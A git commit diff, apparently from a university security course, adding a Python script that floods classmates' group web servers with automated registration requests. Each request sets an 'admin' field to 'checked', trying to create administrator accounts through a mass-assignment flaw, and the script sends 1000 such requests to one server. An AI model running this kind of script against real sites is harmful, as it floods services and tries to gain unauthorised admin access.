5ed933754169a12666763bf36b566653599472b0
emilte <emilte@stud.ntnu.no>
2019-03-22 16:03:26 +0100

    spam.py 2

--- htdocs/public/spam.py
+++ htdocs/public/spam.py
@@ -1,5 +1,23 @@
 import requests
 
-url = "https://grp43.ttm4135.item.ntnu.no:9043/register"
 
-requests.post(url=url, data={'username': 'spam', 'password': 'Django123'})
+def spam(grp=None, a=10, b=44, logResponse=True, nr=10):
+    if grp:
+        a, b = grp, grp
+
+    for i in range(a, b+1):
+        url = "https://grp{0}.ttm4135.item.ntnu.no:90{0}/register".format(i)
+
+        for x in range(1, nr+1):
+            r = requests.post(url=url, data={
+                'username': 'hehehe{}'.format(x),
+                'password': 'U need to hash th1s',
+                'password2': 'U need to hash th1s',
+                'email': 'script{}@spam.no'.format(x),
+                'admin': 'checked',
+                'bio': 'I suck at this',
+            })
+        if logResponse:
+            print(r)
+
+spam(grp=43, nr=1000)
